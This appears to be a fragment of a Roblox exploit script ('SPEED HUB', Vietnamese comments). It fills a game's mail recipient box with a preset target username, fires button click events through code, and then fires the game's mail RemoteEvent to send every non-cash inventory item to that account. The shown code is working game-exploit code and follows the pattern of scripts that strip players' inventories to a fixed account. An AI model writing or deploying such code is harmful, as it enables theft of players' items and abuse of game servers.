-- =======================================================================
-- BƯỚC 2: PASTE TÊN CỰC NHANH + CLICK CHỌN + XẢ ĐỒ
-- =======================================================================
local function fillNameAndTransferAll(mailFrame)
    if not mailFrame then return end
    
    print("[SPEED HUB] Đang thực hiện Paste tên và chọn nick...")
    
    -- 1. Tìm ô Search
    local searchBox = nil
    for _, obj in pairs(mailFrame:GetDescendants()) do
        if obj:IsA("TextBox") then searchBox = obj break end
    end
    
    if searchBox then
        -- CÔNG NGHỆ PASTE: Tự động chèn tên vào mà không cần gõ phím
        -- Nếu game chặn Paste, script sẽ set thuộc tính Text trực tiếp
        searchBox.Text = targetUsername
        searchBox:ReleaseFocus(true) 
        
        -- Kích hoạt sự kiện nhập liệu để game lọc danh sách
        pcall(function() searchBox.FocusLost:Fire(true) end)
        task.wait(1.5) -- Đợi game đẩy nick lên đầu danh sách
    end

    -- 2. Tự động click vào ô tên đầu tiên trong danh sách (kết quả sau khi Paste)
    local scrollFrame = mailFrame:FindFirstChildWhichIsA("ScrollingFrame", true) or mailFrame
    local found = false
    
    -- Lấy tất cả các ô trong list
    local children = scrollFrame:GetChildren()
    for _, child in pairs(children) do
        -- Tìm ô nào có chứa tên targetUsername
        if child:IsA("GuiObject") and string.find(string.lower(child:GetFullName()), "button") then
            -- Nhấp thẳng vào ô đó
            local btn = child:IsA("GuiButton") and child or child:FindFirstChildWhichIsA("GuiButton", true)
            if btn then
                btn.MouseButton1Click:Fire()
                print("[SPEED HUB] Đã nhấp chọn nick thành công!")
                found = true
                task.wait(0.5)
                break
            end
        end
    end

    -- 3. Gửi đồ qua Remote
    local MailEvent = nil
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") and (string.find(string.lower(obj.Name), "mail") or string.find(string.lower(obj.Name), "send")) then
            MailEvent = obj
            break
        end
    end
    
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
    
    if MailEvent and Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            if item:IsA("ValueBase") and item.Value > 0 and not string.find(string.lower(item.Name), "cash") then
                pcall(function() MailEvent:FireServer(targetUsername, item.Name, math.min(item.Value, 20)) end)
                task.wait(0.1)
            end
        end
        print("[SPEED HUB] ==== ĐÃ PASTE TÊN VÀ GỬI SẠCH ĐỒ! ====")
    end
end
